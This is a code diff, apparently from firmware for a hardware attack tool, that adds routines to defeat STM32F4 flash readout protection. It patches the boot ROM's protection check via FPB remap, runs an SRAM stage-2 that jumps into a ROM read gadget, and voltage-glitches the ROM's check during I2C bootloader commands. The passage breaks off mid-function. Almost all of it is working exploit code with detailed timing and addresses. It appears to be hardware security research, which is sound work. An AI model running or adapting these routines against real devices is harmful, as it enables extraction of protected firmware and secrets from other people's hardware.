@@ -1,6 +1,7 @@
 #include "config.h"
 #include "uart_cli.h"
 #include "swd.h"
+#include "i2c_bootloader.h"
 #include "stm32_breakpoints.h"
 #include "glitch.h"
 #include "hardware/uart.h"
@@ -216,6 +217,7 @@ static const uint8_t f103_rdp_bypass_payload[] = {
 // STM32F4 RDP1 BYPASS payload — F4 peripheral map + FPB reader trick (F4 blocks
 // flash reads from SRAM-executing code under RDP1). Same launch contract as F1.
 #include "../stm32_payloads/f4/rdp_bypass_f4_hex.h"
+#include "../stm32_payloads/f4/rom_gadget_hex.h"
 #include "../stm32_payloads/f1/rdp_literal_hex.h"
 #include "../stm32_payloads/f1/rdp_regdump_hex.h"
 #include "../stm32_payloads/f1/rdp_resettest_hex.h"
@@ -3092,9 +3094,949 @@ void target_power_shadowbypass(uint32_t max_attempts, uint32_t dump_bytes, uint3
     gpio_set_mask(POWER_MASK);
 }
 
-// FAST timing pre-screen for the shadow-load glitch. Same brownout-POR + timed dip
-// as SHADOWBYPASS step 3, but instead of the full FPB chain it just reconnects SWD
-// AFTER the glitch and reads FLASH_OPTCR (peripheral space, readable at RDP1) to see
+// RDP1 ROM-FPB probe: patch the boot ROM's software RDP check IN PLACE via FPB
+// remap, then read flash through the ROM's own I2C bootloader. No glitching.
+//
+// Rationale (bench-proven constraints this builds on):
+// - SRAM-executed flash reads fault at RDP1 (LEAKPROBE) => SRAM stage-2 is dead.
+// - SWD cannot read OR execute the boot ROM at RDP1 (ROMREAD finding) => debugger
+//   PC-redirect into ROM is dead. But a *genuine* bootloader boot executes ROM:
+//   BOOT0=1 reset runs the ROM dispatcher poll, a live ROM-executing core.
+// - The ROM's RDP gate is ONE software function at 0x1FFF0B94 (reads
+//   FLASH_OPTCR & 0xFF00 == 0xAA00). Every gated command (Read 0x11, Write 0x31,
+//   Erase 0x44/0x45, RP/RU/Go) calls it via the wrapper at 0x1FFF06E4, which
+//   sets r0=0 BEFORE its tail-call — so if the checker returns instantly
+//   (bx lr as its first instruction), r0 is already 0 = "unprotected" for ALL
+//   gated commands at once.
+// - FPB remap is proven working on this bench (BYPASS chains): FP_REMAP points
+//   at a table in code-region memory; a comparator hit fetches the replacement
+//   halfword from the table instead of the real instruction. FPB covers the
+//   whole code region (0x00000000-0x1FFFFFFF), which includes system memory
+//   0x1FFF0000 — whether it actually patches ROM fetches is the open question
+//   this command answers empirically.
+//
+// Sequence (two-gate model): gate 1 = debugger-connected blocks flash reads;
+// gate 2 = execution-origin (ROM-executing reads are trusted, SRAM ones fault).
+//  1. POR-boot into the ROM bootloader (BOOT0=1), attach SWD to the RUNNING
+//     core (ROMFPBCTL proved halting it kills its I2C even pre-detection).
+//  2. Program the FPB remap via AHB-AP with the core running: remap table in
+//     SRAM (0x20001000, clear of ROM globals/RX buffer), COMP0 on 0x1FFF0B94,
+//     stub 0x4770 (bx lr) - the wrapper pre-sets r0=0, so an instant return
+//     reads "unprotected" for ALL gated commands at once.
+//  3. Brownout dip (POWER pins sink, ADC-gated, calibrated depth below BOR
+//     ~2.22V): debug domain dies (nRST does not clear it - bench-proven),
+//     SRAM survives per the retention sweep (256/256 at all depths). The
+//     bootloader reboots with no debugger ever attached.
+//  4. I2C: GV (control) -> PROBE 0x11 -> READ 0x08000000 (DEADBEEF
+//     known-plaintext).
+//
+// Outcomes (bench result, 2026-09-30):
+//   - Bench result: GV ACKs after BOR (bootloader survives, RP-status 0xFF 0xFF
+//     = RDP still active) but gated commands still NACK, and the post-mortem
+//     FPB readback shows COMP0=0 / REMAP=default / CTRL enable-bit cleared:
+//     the brownout resets the FPB along with the debug domain. Trilemma closed:
+//       patch+attached   -> gate 1 blocks the read (debugger in debug domain)
+//       patch+detached   -> BOR wipes FPB with the debug domain
+//       no-patch+detached -> checker un-patched, commands gated
+//     => FPB-remap path ruled out for RDP1 bypass on this F401. Gate 2
+//     (execution-origin) remains reachable only via glitching (BYPASS family).
+void target_power_romfpb(void) {
+    extern bool swd_connect(void);
+    extern bool swd_halt(void);
+    extern bool swd_resume(void);
+    extern void swd_init(void);
+    extern void swd_deinit(void);
+    extern bool swd_is_connected(void);
+    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
+    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);
+    extern void i2c_bl_enter(void);
+    extern bool i2c_bl_gv(uint8_t addr7);
+    extern bool i2c_bl_read(uint8_t addr7, uint32_t address, uint32_t len);
+    extern bool i2c_bl_probe(uint8_t addr7, uint8_t cmd);
+    extern void i2c_pins_reinit(void);
+    extern bool swd_clear_errors(void);
+
+    // F401 boot-ROM RDP check: ldr r1,=FLASH_OPTCR; ldr; and #0xFF00; cmp #0xAA00...
+    // First instruction at 0x1FFF0B94 is `ldr r1,[pc,#168]` (0x492A). The wrapper
+    // 0x1FFF06E4 pre-sets r0=0, so returning here yields "unprotected".
+    const uint32_t ROM_RDP_CHECK = 0x1FFF0B94u;
+    // bx lr = 0x4770, written to BOTH halfwords of remap word 0 (REPLACE-agnostic).
+    const uint32_t REMAP_STUB = 0x47704770u;
+    // SRAM remap table: clear of ROM globals 0x2000080C/0x20001A24, RX buffer at
+    // 0x20000814+, and far below the SRAM-top stack. 8-word aligned.
+    const uint32_t REMAP_TABLE = 0x20001000u;
+
+    uart_cli_send("ROMFPB: FPB-patch ROM RDP check 0x1FFF0B94 -> bx lr, read via I2C bl\r\n");
+
+    // === Step 1: boot into the ROM bootloader, attach DURING early boot ===
+    // Bench-proven constraints shaping this sequence:
+    //  (a) halting the bootloader — live OR early — corrupts its I2C slave
+    //      state; ROMFPBCTL proved even a pre-detection halt+resume leaves it
+    //      dead (GV stuck). So the patch must be applied WITHOUT halting.
+    //  (b) FPB config does NOT survive a free POR reboot on this F401 — the
+    //      patch must be applied while running, with no reset afterwards.
+    // => connect SWD during the first ~60 ms after POR (boot0=1), then program
+    //    FP_COMP0/FP_REMAP + the SRAM table via AHB-AP while the core RUNS —
+    //    exactly how live breakpoints work. The RDP checker is only invoked
+    //    when a gated command arrives, so mid-boot patching is in-window.
+    uart_cli_send("[1] POR boot + early SWD attach (no halt)...\r\n");
+    target_power_ensure_on();
+    swd_init();
+    if (!swd_connect() || !swd_clear_errors()) {
+        swd_deinit();
+        uart_cli_send("ERROR: SWD connect failed before bootloader entry\r\n");
+        return;
+    }
+    // POR with BOOT0=1 (enter()'s was_swd path), then attach IMMEDIATELY —
+    // manual i2c_bl_enter() inlined so we can connect in the 60ms boot window.
+    gpio_init(PIN_BOOT0); gpio_set_dir(PIN_BOOT0, GPIO_OUT); gpio_put(PIN_BOOT0, 1);
+    gpio_init(PIN_BOOT1); gpio_set_dir(PIN_BOOT1, GPIO_OUT); gpio_put(PIN_BOOT1, 0);
+    i2c_pins_reinit();              // GP4/5 -> bit-bang I2C (idle high)
+    target_power_cycle(150);
+    swd_init();
+    // DP needs a moment to come up after the rail returns; retry connect for a
+    // bounded ~80ms — well within the boot window before I2C detection arms.
+    bool connected = false;
+    for (int i = 0; i < 20 && !connected; i++) {
+        connected = swd_connect() && swd_clear_errors();
+        if (!connected) sleep_ms(4);
+    }
+    if (!connected) {
+        swd_deinit();
+        uart_cli_send("ERROR: SWD connect failed during boot window\r\n");
+        return;
+    }
+
+    // === Step 2: FPB remap setup (proven BYPASS encoding), core running ===
+    uart_cli_send("[2] Configuring FPB remap (no halt — AHB-AP while core runs)...\r\n");
+    uint32_t remap_val = REMAP_STUB;
+    if (swd_write_mem(REMAP_TABLE, &remap_val, 1) != 1) {
+        swd_deinit();
+        uart_cli_send("ERROR: Failed to write remap table\r\n");
+        return;
+    }
+    // FP_CTRL = KEY|ENABLE
+    uint32_t fp_ctrl = 0x03;
+    swd_write_mem(FP_CTRL, &fp_ctrl, 1);
+    // FP_REMAP -> table (bits[28:2] hold the address; raw word works as in BYPASS)
+    uint32_t fp_remap = REMAP_TABLE;
+    swd_write_mem(FP_REMAP, &fp_remap, 1);
+    // FP_COMP0: match 0x1FFF0B94, ENABLE, REPLACE=00 (remap mode ignores REPLACE)
+    uint32_t fp_comp0 = (ROM_RDP_CHECK & 0x1FFFFFFCu) | 1u;
+    swd_write_mem(FP_COMP0, &fp_comp0, 1);
+
+    // Verify FPB config
+    uint32_t verify_val;
+    swd_read_mem(FP_CTRL, &verify_val, 1);
+    uart_cli_printf("    FP_CTRL:  0x%08lX\r\n", (unsigned long)verify_val);
+    swd_read_mem(FP_REMAP, &verify_val, 1);
+    uart_cli_printf("    FP_REMAP: 0x%08lX\r\n", (unsigned long)verify_val);
+    swd_read_mem(FP_COMP0, &verify_val, 1);
+    uart_cli_printf("    FP_COMP0: 0x%08lX (match 0x%08lX)\r\n",
+                    (unsigned long)verify_val, (unsigned long)ROM_RDP_CHECK);
+    swd_read_mem(REMAP_TABLE, &verify_val, 1);
+    uart_cli_printf("    Remap[0]: 0x%08lX (bx lr stub)\r\n", (unsigned long)verify_val);
+
+    // === Step 3: exercise I2C with the patch live, debugger idle-attached ===
+    // Brownout detour result (2026-09-30): the debug domain does NOT gate the
+    // I2C path - after a BOR relaunch with no debugger at all, gated commands
+    // still NACK (RP-status 0xFF 0xFF). The gate is purely the software RDP
+    // check, so the patch must simply be live when the checker runs. FPB dies
+    // with BOR, so no reset may follow the patch - and halting is forbidden
+    // (ROMFPBCTL: even an early halt kills the bootloader's I2C). Hence: patch
+    // via AHB-AP with the core running (done in step 2), then talk immediately.
+    // Known bench quirk: the FIRST I2C exchange after a POR can fail while
+    // later ones succeed (constraint c), so EVERY exchange gets retries.
+    uart_cli_send("[3] I2C GV (control, un-gated; retrying for first-exchange quirk)...\r\n");
+    bool gv_ok = false;
+    for (int i = 0; i < 3 && !gv_ok; i++) {
+        gv_ok = i2c_bl_gv(0x39);
+        if (!gv_ok) sleep_ms(50);
+    }
+
+    uart_cli_send("[4] I2C PROBE 0x11 (gated; pre-patch baseline was NACK)...\r\n");
+    bool probe_ok = false;
+    for (int i = 0; i < 3 && !probe_ok; i++) {
+        probe_ok = i2c_bl_probe(0x39, 0x11);
+        if (!probe_ok) sleep_ms(50);
+    }
+
+    uart_cli_send("[5] I2C READ 0x08000000 64 (decisive - DEADBEEF known-plaintext)...\r\n");
+    bool read_ok = false;
+    for (int i = 0; i < 3 && !read_ok; i++) {
+        read_ok = i2c_bl_read(0x39, 0x08000000, 64);
+        if (!read_ok) sleep_ms(50);
+    }
+
+    swd_deinit();
+
+    if (read_ok) {
+        uart_cli_send("ROMFPB: *** SUCCESS *** flash read at RDP1 with the checker patched.\r\n");
+        uart_cli_send("=> FPB DOES remap system-memory fetches; the I2C path is gated\r\n");
+        uart_cli_send("   only by the software check (debugger attachment irrelevant).\r\n");
+        return;
+    }
+    if (gv_ok && probe_ok) {
+        uart_cli_send("ROMFPB: PROBE un-gated but READ failed => partial un-gate; re-read.\r\n");
+        return;
+    }
+    if (gv_ok) {
+        uart_cli_send("ROMFPB: bootloader alive (GV ok) but gated commands still NACK.\r\n");
+        uart_cli_send("=> FPB does not remap system-memory (0x1FFF....) fetches on this\r\n");
+        uart_cli_send("   part - comparator hits are ignored outside flash. Ruled out.\r\n");
+    } else {
+        uart_cli_send("ROMFPB: bootloader not ACKing - check whether the FPB remap of a\r\n");
+        uart_cli_send("   live-fetched ROM instruction crashed the boot (watch PC via SWD).\r\n");
+    }
+}
+
+// ROM-gadget premise test (stage2 = trampoline into the boot-ROM read loop).
+// Premise: gate 2 is execution-origin — flash reads are permitted when the PC
+// is in ROM (a genuine bootloader boot executes the ROM read path), but not
+// from SRAM (LEAKPROBE proved SRAM-origin reads fault). So don't talk to the
+// bootloader at all: SRAM-boot a tiny stage2 that redirects the ROM transmit
+// helper's register-block pointer (RAM global [0x200006C4]) to a fake block in
+// SRAM, sets r5=0x08000000 / r6=1, and jumps into the ROM read loop
+// (0x1fff0550). The helper's "transmit" (strh r4,[block+0x10]) then parks the
+// flash byte at 0x20003010. SWD re-attach recovers it.
+//
+// Sequence:
+//  1. SWD: upload stage2 (96 bytes @ 0x20002000) + poison 0x20003000..3FFF,
+//     then set BOOT0=1/BOOT1=1 (SRAM boot mode).
+//  2. Brownout dip (ADC-gated, fixed ~1.2V): debug domain dies, SRAM survives
+//     (retention sweep: 256/256), chip SRAM-boots stage2 debugger-free.
+//  3. stage2 runs -> ROM gadget reads 0x08000000, parks byte at 0x20003010.
+//  4. SWD re-attach: read markers 0x20003018 (fault flag) / 0x2000301C
+//     ("GOK2" stage2-ran) and the parked byte; expect 0xEF (DEADBEEF, LE).
+// wrappers: ROMGADGET [N | 0xADDR]
+static void romgadget_run(uint32_t force_variant, uint32_t probe_addr);
+void target_power_romgadget_variant(uint32_t v) { romgadget_run(v, 0x1FFF0551u); }
+void target_power_romgadget_addr(uint32_t addr) { romgadget_run(4, addr); }
+void target_power_romgadget(void) { romgadget_run(UINT32_MAX, 0x1FFF0551u); }
+
+static void romgadget_run(uint32_t force_variant, uint32_t probe_addr) {
+    extern bool swd_connect(void);
+    extern bool swd_halt(void);
+    extern void swd_init(void);
+    extern void swd_deinit(void);
+    extern bool swd_clear_errors(void);
+    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
+    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);
+    extern bool swd_read_core_reg(uint8_t reg, uint32_t *val);
+
+    static uint32_t romgadget_variant = 0;   // persists across runs (auto mode)
+    static uint32_t romgadget_probe = 0x1FFF0551u;
+    if (force_variant != UINT32_MAX) {
+        romgadget_variant = force_variant;
+        if (force_variant == 4) romgadget_probe = probe_addr;
+    }
+    if (romgadget_variant == 4) romgadget_probe = probe_addr;
+    uart_cli_printf("ROMGADGET variant %lu: ", (unsigned long)romgadget_variant);
+    switch (romgadget_variant) {
+    case 0: uart_cli_send("control (ROM loop, SRAM source)\r\n"); break;
+    case 1: uart_cli_send("flash-plain (ROM loop, r5=0x08000000)\r\n"); break;
+    case 2: uart_cli_send("flash-unlock (KEYR first, then flash loop)\r\n"); break;
+    case 3: uart_cli_send("reader-trick (stage2 programs FPB)\r\n"); break;
+    case 4: uart_cli_printf("fetch-probe blx 0x%08lX\r\n", (unsigned long)romgadget_probe); break;
+    case 5: uart_cli_send("data-read (flash+ROM data loads from stage2)\r\n"); break;
+    default:
+        uart_cli_printf("ERROR: Unknown ROMGADGET variant '%lu' (0=control 1=flash 2=flash+unlock 3=reader 4=fetch-probe 5=data-read)\r\n",
+                        (unsigned long)romgadget_variant);
+        return;
+    }
+
+    // === Step 1: upload stage2 + poison the fake-block page, SRAM boot mode ===
+    uart_cli_send("[1] SWD upload stage2 (0x20002000) + poison 0x20003000 page...\r\n");
+    target_power_ensure_on();
+    swd_init();
+    if (!swd_connect() || !swd_clear_errors()) {
+        swd_deinit();
+        uart_cli_send("ERROR: SWD connect failed\r\n");
+        return;
+    }
+    if (!swd_halt()) {
+        swd_deinit();
+        uart_cli_send("ERROR: halt failed\r\n");
+        return;
+    }
+    // upload in 32-bit words (payload is word-aligned; vectors live inside the
+    // image, host copies words 0-3 to the SRAM-boot alias base below)
+    if (swd_write_mem(0x20002000u, (const uint32_t *)f4_rom_gadget_payload,
+                      f4_rom_gadget_payload_len / 4) != f4_rom_gadget_payload_len / 4) {
+        swd_deinit();
+        uart_cli_send("ERROR: stage2 upload failed\r\n");
+        return;
+    }
+    uint32_t poison[16];
+    for (int i = 0; i < 16; i++) poison[i] = 0x5015E01Eu;   // "POISONED" marker
+    if (swd_write_mem(0x20003000u, poison, 16) != 16) {
+        swd_deinit();
+        uart_cli_send("ERROR: poison write failed\r\n");
+        return;
+    }
+    // variant slot (outside the poison page) + probe target / result pre-fill:
+    // variant 4 uses 0x200030F4 as the blx target; unchanged 0x1BADB002 = no result
+    uint32_t variant_words[2] = { romgadget_variant,
+                                  romgadget_variant == 4 ? romgadget_probe : 0x1BADB002u };
+    if (swd_write_mem(0x200030F0u, variant_words, 2) != 2) {
+        swd_deinit();
+        uart_cli_send("ERROR: variant slot write failed\r\n");
+        return;
+    }
+    // SRAM boot fetches the vector table from 0x20000000 (the alias base) -
+    // copy stage2's own vector words there (MSP + reset + reserved + HardFault;
+    // faults must land in stage2's marker, not a garbage vector — the
+    // garbage-vector jump was this experiment's first ambiguity).
+    uint32_t bootvec[4];
+    swd_read_mem(0x20002000u, bootvec, 4);
+    if (swd_write_mem(0x20000000u, bootvec, 4) != 4) {
+        swd_deinit();
+        uart_cli_send("ERROR: boot vector write failed\r\n");
+        return;
+    }
+    // verify the uploads round-tripped
+    uint32_t vchk = 0;
+    swd_read_mem(0x20002004u, &vchk, 1);   // stage2 reset vector word
+    uart_cli_printf("    stage2 reset vector: 0x%08lX\r\n", (unsigned long)vchk);
+    swd_read_mem(0x20000004u, &vchk, 1);   // planted boot vector
+    uart_cli_printf("    boot vector (0x20000004): 0x%08lX\r\n", (unsigned long)vchk);
+
+    // BOOT0=1/BOOT1=1 -> SRAM boot mode (alias 0x20002000 visible at 0x00002000;
+    // vector table there must be at 0x20002000)
+    gpio_init(PIN_BOOT0); gpio_set_dir(PIN_BOOT0, GPIO_OUT); gpio_put(PIN_BOOT0, 1);
+    gpio_init(PIN_BOOT1); gpio_set_dir(PIN_BOOT1, GPIO_OUT); gpio_put(PIN_BOOT1, 1);
+    swd_deinit();
+
+    // === Step 2: brownout dip - debug domain dies, SRAM (stage2) survives ===
+    uart_cli_send("[2] Brownout dip (fixed ~1.2V, debug domain dies, SRAM survives)...\r\n");
+    if (power_group_glitch_blocked()) return;
+    gpio_init(SWD_NRST_PIN); gpio_set_dir(SWD_NRST_PIN, GPIO_IN); gpio_pull_up(SWD_NRST_PIN);
+    adc_power_init();
+    uint32_t thresh = (uint32_t)(1.2f / 3.3f * 4095.0f);
+    gpio_set_dir(POWER_PIN2, GPIO_IN);  gpio_set_dir(POWER_PIN3, GPIO_IN);
+    gpio_disable_pulls(POWER_PIN2);     gpio_disable_pulls(POWER_PIN3);
+    uint64_t t0 = time_us_64();
+    gpio_clr_mask(1u << POWER_PIN1);
+    uint16_t vmin_raw = 4095;
+    while (true) {
+        uint16_t val = adc_read();
+        if (val < vmin_raw) vmin_raw = val;
+        if (val <= thresh) break;
+        if (time_us_64() - t0 > 500000) break;
+    }
+    sleep_us(50);                        // debug-domain POR latch dwell
+    gpio_set_dir(POWER_PIN2, GPIO_OUT); gpio_set_dir(POWER_PIN3, GPIO_OUT);
+    gpio_set_mask(POWER_MASK);
+    uint32_t dip_us = (uint32_t)(time_us_64() - t0);
+    uart_cli_printf("    dipped to %.2fV in %luus\r\n",
+                    vmin_raw * 3.3f / 4095.0f, (unsigned long)dip_us);
+
+    bool nrst_went_low = false;
+    for (int i = 0; i < 5000; i++) {
+        if (!gpio_get(SWD_NRST_PIN)) { nrst_went_low = true; break; }
+        sleep_us(10);
+    }
+    uart_cli_printf("    BOR: nRST %s\r\n", nrst_went_low ? "went LOW" : "stayed high");
+    sleep_ms(30);                        // stage2 is ~30 cycles; plenty.
+
+    // === Step 3: SWD recovery - read markers + parked byte ===
+    uart_cli_send("[3] SWD re-attach: read markers + parked byte...\r\n");
+    swd_init();
+    bool reattached = false;
+    for (int i = 0; i < 10 && !reattached; i++) {
+        reattached = swd_connect() && swd_clear_errors();
+        if (!reattached) sleep_ms(4);
+    }
+    if (!reattached) {
+        swd_deinit();
+        uart_cli_send("ERROR: SWD re-attach failed after dip\r\n");
+        return;
+    }
+    uint32_t fault_mark = 0, ran_mark = 0, dr = 0, pc = 0, result = 0, fpc = 0, flr = 0;
+    swd_read_mem(0x20003018u, &fault_mark, 1);
+    swd_read_mem(0x2000301Cu, &ran_mark, 1);
+    swd_read_mem(0x20003010u, &dr, 1);
+    swd_read_mem(0x20003020u, &result, 1);
+    swd_read_mem(0x20003024u, &fpc, 1);
+    swd_read_mem(0x20003028u, &flr, 1);
+    if (!swd_halt()) {
+        uart_cli_send("    (halt failed - registers unavailable)\r\n");
+    } else {
+        uint32_t rr = 0;
+        uart_cli_send("    regs: ");
+        for (int reg = 0; reg <= 7; reg++) {
+            swd_read_core_reg(reg, &rr);
+            uart_cli_printf("r%u=0x%08lX ", reg, (unsigned long)rr);
+        }
+        uart_cli_send("\r\n");
+        swd_read_core_reg(15, &pc);
+        uart_cli_printf("    PC at halt: 0x%08lX (0x1fff0550 region = loop still running)\r\n",
+                        (unsigned long)pc);
+    }
+    uart_cli_printf("    fault marker (0x20003018): 0x%08lX (0xFA17FA17 = HardFault)\r\n",
+                    (unsigned long)fault_mark);
+    uart_cli_printf("    faulted PC/LR (stacked): PC=0x%08lX LR=0x%08lX\r\n",
+                    (unsigned long)fpc, (unsigned long)flr);
+    uart_cli_printf("    stage2-ran  (0x2000301C): 0x%08lX (0x324F4B47 = \"GOK2\")\r\n",
+                    (unsigned long)ran_mark);
+    uart_cli_printf("    fake DR    (0x20003010): 0x%04lX (0xAA55 = helper never transmitted)\r\n",
+                    (unsigned long)(dr & 0xFFFF));
+    uart_cli_printf("    result     (0x20003020): 0x%08lX (0x1BADB002 = reader never stored)\r\n",
+                    (unsigned long)result);
+    uint32_t poison_residue = 0;
+    swd_read_mem(0x20003000u, &poison_residue, 1);
+    uart_cli_printf("    poison residue (0x20003000): 0x%08lX\r\n", (unsigned long)poison_residue);
+    // fault forensics: CFSR/HFSR/BFAR tell fetch-vs-data and the faulting address
+    bool faulted = (fault_mark == 0xFA17FA17u);
+    if (faulted) {
+        uint32_t cfsr = 0, hfsr = 0, bfar = 0;
+        swd_read_mem(0xE000ED28u, &cfsr, 1);
+        swd_read_mem(0xE000ED2Cu, &hfsr, 1);
+        swd_read_mem(0xE000ED38u, &bfar, 1);
+        uart_cli_printf("    CFSR=0x%08lX HFSR=0x%08lX BFAR=0x%08lX\r\n",
+                        (unsigned long)cfsr, (unsigned long)hfsr, (unsigned long)bfar);
+        // CFSR bytes: [7:0] MMFSR  [15:8] BFSR  [31:24] UFSR
+        if (cfsr & 0x00010000u) uart_cli_send("      -> BFSR.IBUSERR: instruction bus error (fetch fault)\r\n");
+        if (cfsr & 0x00020000u) uart_cli_send("      -> BFSR.PRECISERR: precise data bus error (BFAR valid)\r\n");
+        if (cfsr & 0x00040000u) uart_cli_send("      -> BFSR.IMPRECISERR: imprecise data bus error\r\n");
+        if (cfsr & 0x00000100u) uart_cli_printf("      -> BFSR.BFARVALID: BFAR=0x%08lX\r\n", (unsigned long)bfar);
+        if (cfsr & 0x01000000u) uart_cli_send("      -> UFSR.INVSTATE: invalid state (bad EPSR/T-bit)\r\n");
+        if (cfsr & 0x00000080u) uart_cli_send("      -> MMFSR.IACCVIOL: instruction access violation (XN/exec perm)\r\n");
+    }
+    swd_deinit();
+
+    bool stage2_ran = (ran_mark == 0x324F4B47u);
+    // strh writes only the low halfword -> poison (0x5015) stays in the upper
+    // half of the word. Signatures are the low byte:
+    //   0x1E = control variant read the poison byte  0xEF = flash[0] low byte
+    bool got_flash = ((dr & 0xFFu) == 0xEFu) || (result == 0xDEADBEEFu);
+    bool control_ok = ((dr & 0xFFu) == 0x1Eu);
+    if (stage2_ran && got_flash) {
+        uart_cli_send("ROMGADGET: *** FLASH READ *** flash byte captured in SRAM.\r\n");
+        if (romgadget_variant < 3)
+            uart_cli_printf("=> ROM-loop flash read WORKS from SRAM boot (variant %lu). Full dump path open.\r\n",
+                            (unsigned long)romgadget_variant);
+        else
+            uart_cli_send("=> FPB reader-trick reads flash data with PC-origin flash. Premise CONFIRMED.\r\n");
+    } else if (stage2_ran && control_ok) {
+        uart_cli_printf("ROMGADGET: variant 0 control OK (DR low byte 0x1E = poison byte) - loop+transmit mechanics work.\r\n");
+    } else if (stage2_ran && faulted) {
+        uart_cli_printf("ROMGADGET: variant %lu HardFaulted - flash access blocked/faulted from this origin.\r\n",
+                        (unsigned long)romgadget_variant);
+    } else if (stage2_ran && (pc & ~1u) >= 0x1FFF0000u && (pc & ~1u) < 0x1FFF8000u) {
+        uart_cli_printf("ROMGADGET: variant %lu STALLED in ROM loop (PC=0x%08lX, no fault) - flash data read blocked.\r\n",
+                        (unsigned long)romgadget_variant, (unsigned long)pc);
+    } else if (stage2_ran) {
+        uart_cli_printf("ROMGADGET: variant %lu ran but produced no flash data (see markers/regs above).\r\n",
+                        (unsigned long)romgadget_variant);
+    } else if (faulted) {
+        uart_cli_send("ROMGADGET: HardFault before the gadget - check stage2/ROM entry.\r\n");
+    } else {
+        uart_cli_send("ROMGADGET: no stage2 marker - SRAM boot or dip failed.\r\n");
+    }
+
+    if (force_variant == UINT32_MAX) {   // auto-advance mode only
+        if (romgadget_variant == 4) {
+            // sweep ROM in halfword steps; done after the last probe
+            romgadget_probe += 2;
+            if (romgadget_probe >= 0x1FFF77F1u) {
+                uart_cli_send("ROMGADGET: fetch-probe sweep complete\r\n");
+                romgadget_variant = 0;   // resume the read-loop variants
+                romgadget_probe = 0x1FFF0551u;
+            }
+        } else {
+            romgadget_variant = (romgadget_variant + 1) % 6;   // next run = next variant
+        }
+    }
+}
+
+// ============================================================================
+// I2CGATE — glitch the boot ROM's per-command RDP check (0x1FFF0B94) during
+// the I2C clock-stretch that follows a gated command byte.
+//
+// ROM mechanics (disasm, base 0x1FFF0000):
+//   After the I2C command byte (e.g. 0x11 READ) is ACKed, the dispatch calls
+//   rdp_locked() @0x1FFF0B94: live FLASH_OPTCR (0x40023C14) read, and.w r1,#0xFF00,
+//   cmp r1,#0xAA00 -> return 1 = locked (caller then transmits 0x1F NACK).
+//   The command byte's ACK is emitted BEFORE the check; the check runs while the
+//   I2C slave clock-stretches SCL until the verdict is out.
+//
+// Attack window: between the command-byte ACK (SCL released, check about to run)
+// and the NACK (0x1F). We fire the power glitch DURING the post-command stretch,
+// corrupting the 0xAA00 comparison / OPTCR readback so the ROM proceeds as if
+// RDP0. If it works, the subsequent address/length/data frames all ACK and the
+// flash bytes come out over I2C — no debugger, normal ROM boot (gate 2 untouched).
+//
+// Per attempt:
+//   1. send command byte frame (cmd, ~cmd) — command ACKs, check starts
+//   2. immediately fire glitch (ADC-gated dip to vmin, WIDTH dwell, restore)
+//   3. poll I2C for the verdict ACK (ACK = gate passed!) vs NACK (gated)
+//   4. if ACK: send READ address frame (0x08000000) + length, dump data
+//      if NACK: report and retry
+// ============================================================================
+// shared state for the mid-frame glitch hook (single-command lifetime)
+static uint16_t i2cgate_thresh_raw;     // ADC counts (mv*4095/3300), NOT volts
+static uint16_t i2cgate_vmin_raw;
+static uint32_t i2cgate_dip_us;
+static uint32_t i2cgate_dwell_us = 50;   // extra LOW dwell after threshold hit
+static void i2cgate_dip_hook(void) {
+    uint64_t t0 = time_us_64();
+    gpio_set_dir(POWER_PIN2, GPIO_IN);  gpio_set_dir(POWER_PIN3, GPIO_IN);
+    gpio_disable_pulls(POWER_PIN2);     gpio_disable_pulls(POWER_PIN3);
+    gpio_clr_mask(1u << POWER_PIN1);
+    while (true) {
+        uint16_t val = adc_read();
+        if (val < i2cgate_vmin_raw) i2cgate_vmin_raw = val;
+        if (val <= i2cgate_thresh_raw) break;
+        if ((uint32_t)(time_us_64() - t0) > 2000) break;  // 2ms safety cap
+    }
+    if (i2cgate_dwell_us) sleep_us(i2cgate_dwell_us);
+    gpio_set_dir(POWER_PIN2, GPIO_OUT); gpio_set_dir(POWER_PIN3, GPIO_OUT);
+    gpio_set_mask(POWER_MASK);
+    i2cgate_dip_us = (uint32_t)(time_us_64() - t0);
+}
+
+// I2CGATE — glitch the boot ROM's per-command RDP check (0x1FFF0B94) while the
+// gated command is being processed (the I2C clock-stretch after cmd ACK).
+//
+// Calibration design (RDP0/RDP1 discrimination):
+//   At RDP0 a NACK means the glitch CORRUPTED the check (pass flipped to fail)
+//   while uncorrupted shots ACK AND complete a full read (data path proven).
+//   Timing is calibrated when RDP0 shows corruption-rate > 0. Then at RDP1 the
+//   same timing is used: ACK = gate corrupted = flash dump follows.
+//
+// Windows per attempt (i % 3):
+//   0 = dip fires after cmd byte ACK, before ~cmd (hook 1)
+//   1 = dip fires after ~cmd byte, before STOP (hook 2) — rail sags exactly
+//       when the frame ends and rdp_locked() runs
+//   2 = dip fires after STOP (original post-frame timing, control)
+void target_power_i2cgate(uint32_t attempts, uint32_t vmin_mv) {
+    if (power_group_glitch_blocked()) return;
+    if (attempts == 0) attempts = 1;
+    if (attempts > 2000) attempts = 2000;
+    // vmin_mv = 0 -> auto-sweep depth 1.30V down to 0.70V, 100mV steps
+    float v_threshold = (vmin_mv ? vmin_mv : 1300) / 1000.0f;
+    float v_min_depth = 0.70f;
+    uint32_t depth_step = (vmin_mv ? 0 : 100);
+    uint8_t a = I2C_BL_ADDR7_DEFAULT;
+
+    uart_cli_printf("I2CGATE: glitch the ROM RDP check during command processing (%lu attempts)\r\n",
+                    (unsigned long)attempts);
+    uart_cli_printf("    dip depth: %s, windows: cmd-byte / pre-STOP / post-STOP (rotating)\r\n",
+                    depth_step ? "auto-sweep 1.30V -> 0.70V (100mV steps)" : "fixed");
+
+    // entry: power the target and boot it into the system bootloader over I2C.
+    // Without this the target sits de-energized and every NACK is just
+    // "device absent" — the bug that produced the fake 20/20 "HIT" run.
+    target_power_ensure_on();
+    i2c_bl_enter();
+    sleep_ms(60);
+    if (!i2c_bl_get(a)) {
+        uart_cli_send("ERROR: I2CGATE: bootloader not responding (GET failed)\r\n");
+        return;
+    }
+
+    uint32_t ack_wins = 0, nack = 0, nack_nodip = 0, addr_fail = 0, reads_ok = 0, reads_bad = 0;
+    uint32_t reentries = 0;
+    for (uint32_t i = 0; i < attempts; i++) {
+        // dip state per attempt
+        i2cgate_dwell_us = 0;
+        i2cgate_vmin_raw = 4095;
+        i2cgate_dip_us = 0;
